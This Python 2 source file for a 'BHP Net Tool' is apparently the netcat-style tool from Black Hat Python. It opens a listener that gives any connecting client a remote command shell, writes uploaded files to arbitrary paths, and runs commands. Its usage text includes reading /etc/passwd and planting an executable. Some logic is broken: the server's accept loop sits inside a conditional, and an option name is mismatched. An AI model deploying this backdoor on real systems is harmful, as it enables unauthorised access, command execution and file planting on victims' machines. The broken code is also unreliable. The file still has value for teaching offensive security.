import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def client_sender(buffer):
	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		client.connect((target,port))

		if len(buffer):
			client.send(buffer)

		while True:
			recv_len = 1
			response = ""

			while recv_len:

				data = client.recv(4096)
				recv_len = len(data)
				response += data

				if recv_len < 4096:
					break

			print response,

			buffer = raw_input("")
			buffer += "\n"

			client.send(buffer)

	except Exception as e:
		print "[*] Exception! Exiting.",e
		client.close()

def server_loop():
	global target

	if not len(target):
		target = "0.0.0.0"

		server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

		server.bind((target,port))

		server.listen(5)

		print "[*] Listening on %s:%d" % (target,port)

		while True:
			client_socket, addr = server.accept()
			print "[*] Accepted connection from: %s:%d " % (addr[0],addr[1])

			client_thread = threading.Thread(target=client_handler,args=(client_socket,))

			client_thread.start()

def run_command(command):
	command = command.rstrip()

	try:
		output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
	except Exception as e:
		output = "Failed to execute command.\r\n"

	return output

def client_handler(client_socket):
	global upload
	global execute
	global command

	
	if len(upload_destination):

		file_buffer = ""

		while True:
			data = client_socket.recv(1024)

			if not data:
				break

			else:

				file_buffer += data

		try:
			file_descriptor = open(upload_destination,"wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
		except Exception as e:
			client_socket.send("Failed to save file to %s\r\n" % upload_destination)


	if len(execute):

		output = run_command(execute)

		client_socket.send(output)

	if command:

		while True:
			client_socket.send("<BHP:#> ")

			cmd_buffer = ""

			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			response = run_command(cmd_buffer)

			client_socket.send(response)
				










readme = '''
BHP Net Tool 
Usage: bhpnet.py -t target_host -p -port
                 -l --listen 
                 -e --execute=file_to_run
                 -c --command
                 -u --upload=destination

Examples:
bhpnet.py -t 192.168.0.1 -p 5555 -l -c
bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe
bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"
echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.1.12 -p 135
'''

def usage():
	print readme
	sys.exit(0)

def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
			["help","listen","execute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print str(err)

	for opt,value in opts:
		if opt in ("-h","--help"):
			usage()
		elif opt in ("-l","--listen"):
			listen = True
		elif opt in ("-e","--execute"):
			execute = value
		elif opt in ("-c","--commandshell"):
			command = True
		elif opt in ("-u","--upload"):
			upload_destination = value
		elif opt in ("-t","--target"):
			target = value
		elif opt in ("-p","--port"):
			port = int(value)
		else:
			assert False,"Unhandled Option"

	if not listen and len(target) and port > 0:

		buffer = sys.stdin.read()
		client_sender(buffer)

	if listen:
		server_loop()

if __name__ == '__main__':
	main()


